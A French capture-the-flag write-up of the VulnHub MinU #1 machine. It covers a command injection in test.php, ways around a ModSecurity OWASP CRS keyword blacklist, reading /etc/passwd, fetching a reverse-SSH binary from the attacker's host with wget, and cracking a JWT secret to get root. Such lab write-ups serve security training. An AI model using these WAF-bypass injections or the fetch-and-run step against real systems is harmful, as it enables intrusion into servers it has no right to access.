---
title: "Solution du CTF MinU #1 de VulnHub"
tags: [CTF,VulnHub]
---

[MinU #1](https://vulnhub.com/entry/minu-1,235/) fait partie de ces CTFs qui ne payent pas de mine et dont la description n'annonce rien de particulier. Pourtant, on se retrouve très vite à batailler avec un VRAI WAF et non une petite protection home made.

## Ça va couper, chérie !

La VM n'expose qu'un serveur web avec une page d'index par défaut.

J'ai énuméré un moment et je donne ci-dessous un aperçu de ce qui a été trouvé :

```
403       13l       50w        0c http://192.168.56.214/scandir/
403       13l       50w        0c http://192.168.56.214/readfile.php
403       13l       50w        0c http://192.168.56.214/function.readfile
403       13l       50w        0c http://192.168.56.214/function.scandir
403       13l       50w        0c http://192.168.56.214/readfile.aspx
200       40l      159w     1986c http://192.168.56.214/test.php
200        1l        3w       20c http://192.168.56.214/last.html
403       13l       50w        0c http://192.168.56.214/readfile.php
```

Les réponses 403 ne sont vraisemblablement pas liées à des problèmes de permissions. En effet, les noms bloqués correspondent à des noms de fonctions PHP. Cela laisse supposer qu'au minimum une blacklist de mots clés est en place.

Le script qui nous intéresse ici est `test.php` qui peut visiblement charger un fichier présent sur le système.

```html
    <h2>OMGJS - <strike>Everything</strike> a browser knows about you</h2>
    <small>It actually knows more...</small>
    <noscript>No js yay!</noscript>
    <p id='data'></p>
    <a href='test.php?file=last.html'>Read last visitor data</a>
```

J'ai lancé `Wapiti` sur l'URL et il a rapidement trouvé une injection de commande avec le payload `&set&`, payload qui a le bénéfice de donner un résultat sur Windows ET Linux.

J'ai d'abord pensé à un faux positif, car c'est étonnant que le script puisse à la fois recevoir un nom de fichier et une commande. Pourtant en regardant l'output du script, on valide l'exécution :

```bash
APACHE_LOCK_DIR='/var/lock/apache2'
APACHE_LOG_DIR='/var/log/apache2'
APACHE_PID_FILE='/var/run/apache2/apache2.pid'
APACHE_RUN_DIR='/var/run/apache2'
APACHE_RUN_GROUP='www-data'
APACHE_RUN_USER='www-data'
IFS=' 
'
INVOCATION_ID='ad29a2ed2ba244499bf0b55a8856ca07'
JOURNAL_STREAM='9:14931'
LANG='C'
LANGUAGE='en_GB:en'
OPTIND='1'
PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
PPID='888'
PS1='$ '
PS2='> '
PS4='+ '
PWD='/var/www/html'
```

Je ne suis pas expert Apache, mais cette variable d'environnement `INVOCATION_ID` me laisse supposer qu'un reverse proxy ou un composant quelconque est présent pour traiter les requêtes HTTP avant d'être gérées par le serveur.

On remarque rapidement qu'on ne peut pas placer n'importe quoi dans notre payload : les commandes classiques telles que `uname`, `ls`, `curl`, `wget`, `cat` sont bloquées et on obtient une erreur 403.

De même toutes utilisations des pipes (`|`) ou redirections sont immédiatement rejetées.

L'utilisation des tirets est aussi bloquée dans certains cas et la plupart des paths le sont aussi.

## CRS, S, S

Un système basé sur une blacklist a toujours l'inconvénient de passer quelques exceptions. Ainsi pour obtenir un listing de dossier, on peut utiliser la commande `dir` à la place de `ls`.

Le WAF bloquait aussi l'accès si on effectuait une opération sur un fichier avec l'extension `.php`.

Je voulais obtenir le code source de `test.php` pour comprendre mieux la vulnérabilité et c'est finalement la commande `dd` (qui envoie par défaut son output sur la console) qui m'a aidé :

```bash
dd if=test.php skip=1 bs=1
```

Là le comportement hybride entre affichage d'un fichier et exécution s'explique :

```php
?php echo shell_exec('cat ' . $_GET['file']);?>
```

Je suis finalement parvenu à aller fouiller des fichiers dans l'arborescence, mais il faut une fois de plus ruser :

```bash
cd /;cd etc;tac passwd
```

On voyait alors l'existence d'un utilisateur nommé `bob`.

J'ai ensuite voulu savoir quel mécanisme bloquait mes requêtes. Il s'agit d'un module Apache :

```bash
cd /;cd etc;cd apache2;tac mods-enabled/security2.conf
```

Remis dans le bon sens (la commande `tac` affiche les lignes d'un fichier dans le sens inverse) j'obtiens ceci :

```apache
<IfModule security2_module>
        # Default Debian dir for modsecurity's persistent data
        SecDataDir /var/cache/modsecurity

        # Include all the *.conf files in /etc/modsecurity.
        # Keeping your local configuration in that directory
        # will allow for an easy upgrade of THIS file and
        # make your life easier
        IncludeOptional /etc/modsecurity/*.conf

        # Include OWASP ModSecurity CRS rules if installed
        IncludeOptional /usr/share/modsecurity-crs/owasp-crs.load
</IfModule>
```

## Quoicouken

Revenons un peu sur l'utilisateur `bob`.

Je peux lister son dossier personnel et on n'y trouve qu'un fichier caché `._pw_` dont voici le contenu :

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg`

Il s'agit clairement d'un token JWT bien que je n'en aie pas croisé beaucoup sur des CTFs.

Je peux le décoder via le site https://token.dev/ qui me donne le header :

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Ainsi que le payload :

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

Faute de mieux pour le moment j'ai décidé de pwner le serveur pour obtenir un shell digne de ce nom.

En utilisant une technique que j'ai employée sur le [CTF Bandit de OverTheWire]({% link _posts/2023-04-28-Solution-du-Wargame-Bandit-de-OverTheWire.md %}#level-32) je peux faire passer certaines commandes :

```bash
linux64 uname -a
```

Je ne saurais pas expliquer en détails ce que font les commandes `linux32` et `linux64` car elles n'ont pas de page de manuel, mais il semble qu'elles permettent de lancer un exécutable en lui donnant ou retirant certaines options.

On a affaire à un système 32 bits.

```
Linux MinU 4.13.0-39-generic #44-Ubuntu SMP Thu Apr 5 14:21:12 UTC 2018 i686 i686 i686 GNU/Linux
```

Finalement je parviens à faire fonctionner `wget` :

```bash
linux64 wget http://192.168.56.1/reverse-sshx86
```

Seulement, quand je regarde la taille du fichier téléchargé (via `stat`, car `ls` appelé avec des options est bloqué) ... il est vide.

Finalement en téléchargeant dans `/dev/shm` ça fonctionne (indice qui aurait dû me diriger vers un bug de la VM comme on verra plus tard).

Je peux donc rapatrier un `reverse-ssh` de cette façon :

```bash
cd /dev/shm;linux64 wget http://192.168.56.1/rs86
```

Et je préfixe `chmod` par `linux64` de la même façon pour rendre le fichier exécutable.

Petite astuce au passage : si le fichier est dans un point de montage n'autorisant pas l'exécution, on peut obtenir le path du linker en appelant `ldd` sur un binaire quelconque :

```bash
cd /bin;linux64 ldd tar
```

On voit ici que le path est `/lib/ld-linux.so.2` :

```
        linux-gate.so.1 =>  (0xb7f3e000)
        libacl.so.1 => /lib/i386-linux-gnu/libacl.so.1 (0xb7eb5000)
        libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7e89000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7cb3000)
        libattr.so.1 => /lib/i386-linux-gnu/libattr.so.1 (0xb7cad000)
        libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7c36000)
        libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7c31000)
        /lib/ld-linux.so.2 (0xb7f40000)
        libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7c12000)
```

On peut alors appeler `/lib/ld-linux.so.2 mon_executable` qui exécutera `mon_executable` même s'il n'a pas les permissions requises.

Après le `chmod` j'étais en mesure d'exécuter `reverse-ssh` qui lançait un serveur SSH sur le port 31337.

## Craque trop

D'après [Brute Force - CheatSheet - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#jwt) il y a plusieurs moyens de cracker un token JWT.

Dans notre cas, ce projet fonctionne très bien : [GitHub - brendan-rius/c-jwt-cracker: JWT brute force cracker written in C](https://github.com/brendan-rius/c-jwt-cracker)

```console
$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
Secret is "mlnV1"
```

Le mot de passe obtenu permet de passer `root` via `su` :

```console
root@MinU:~# cat flag.txt 
  __  __ _       _    _      __
 |  \/  (_)     | |  | |    /_ |
 | \  / |_ _ __ | |  | |_   _| |
 | |\/| | | '_ \| |  | \ \ / / |
 | |  | | | | | | |__| |\ V /| |
 |_|  |_|_|_| |_|\____/  \_/ |_|


# You got r00t!

flag{c89031ac1b40954bb9a0589adcb6d174}

# You probably know this by now but the webserver on this challenge is
# protected by mod_security and the owasp crs 3.0 project on paranoia level 3.
# The webpage is so poorly coded that even this configuration can be bypassed
# by using the bash wildcard ? that allows mod_security to let the command through.
# At least that is how the challenge was designed ;)
# Let me know if you got here using another method!

# contact@8bitsec.io
# @_8bitsec
```

`JtR` est tout aussi capable de casser le hash mais son mode incrémental est plus recherché et va tester les combinaisons les plus probables avant (via des statistiques sur les digrammes / trigrammes). Malheureusement ça lui fait prendre trop de temps pour casser le mot de passe du CTF mais `JtR` n'en reste pas point ultra performant en termes de passwords testés à la seconde.

Alternativement `LinPEAS` remonte quelques failles pour l'escalade de privilèges :

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010
```

Je ne les ai pas testées, car ce n'était pas la solution attendue.

## Bourré

En réalité si on ne pouvait qu'écrire dans `/dev/shm` c'est parce qu'il n'y avait plus d'espace libre sur le disque de la VM.

Tout était pris par les logs d'Apache :

```
-rw-r--r-- 1 root root   7.4M May 23 07:41 access.log
-rw-r--r-- 1 root root    66M May 23 07:23 error.log
-rw-r----- 1 root root   183M May 23 07:23 modsec_audit.log
```

Je ne le dirais jamais assez : quand vous créez un CTF, désactivez les logs s'ils n'ont pas d'utilité pour les joueurs.

L'écriture dans `/dev/shm` fonctionnait car les fichiers qu'on y dépose sont stockés dans la RAM et non sur le disque.

Pour ce qui est de l'identification du WAF, j'ai vu dans le writeup [Vulnhub MinU: 1 Walkthrough](https://www.sevenlayers.com/index.php/blog/206-vulnhub-minu-1-walkthrough) que son auteur utilisait `wafw00f` pour déterminer qu'il s'agissait de `mod_security` avec `OWASP CRS`.

J'ai pourtant testé les solutions suivantes après avoir terminé le CTF et aucune n'a pu identifier le WAF :

[GitHub - EnableSecurity/wafw00f: WAFW00F allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.](https://github.com/EnableSecurity/wafw00f)

[GitHub - Ekultek/WhatWaf: Detect and bypass web application firewalls and protection systems](https://github.com/Ekultek/WhatWaf)

[nmap/http-waf-detect.nse at master · nmap/nmap · GitHub](https://github.com/nmap/nmap/blob/master/scripts/http-waf-detect.nse)

[GitHub - stamparm/identYwaf: Blind WAF identification tool](https://github.com/stamparm/identYwaf)
